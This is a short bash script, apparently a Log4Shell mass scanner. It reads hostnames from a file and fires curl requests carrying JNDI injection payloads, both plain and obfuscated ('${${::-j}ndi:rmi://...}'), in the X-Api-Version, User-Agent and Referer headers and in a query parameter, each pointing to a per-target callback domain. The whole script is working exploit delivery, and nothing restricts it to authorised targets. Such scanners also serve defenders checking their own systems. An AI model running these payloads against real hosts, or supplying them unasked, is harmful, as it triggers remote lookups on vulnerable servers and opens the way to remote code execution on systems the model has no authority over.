#!/bin/bash

function scan () {
  # debug(X-Api-Version Header)
  echo "$1 $2"
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash

  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$2/a}'|g"          | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$2/a}'|g"    | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$2/a}}'|g"                  | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$2/a}'|g"             | sed "s|\$1|$1|g" | bash
}

while read fqdn
do
  echo "$fqdn"
  DNS_QUERY=log4shell.`date +%s`.`echo "$fqdn" | sed -e "s|^https://||g" | sed -e "s|^http://||g" | sed -e "s|:.*$||g" | sed -e "s|/.*$||g"`.$DOMAIN

  # call scan
  if [[ $fqdn == "http"* ]]
  then
    scan $fqdn $DNS_QUERY
  else 
    scan http://$fqdn $DNS_QUERY
    scan https://$fqdn $DNS_QUERY
  fi
done < fqdn.txt
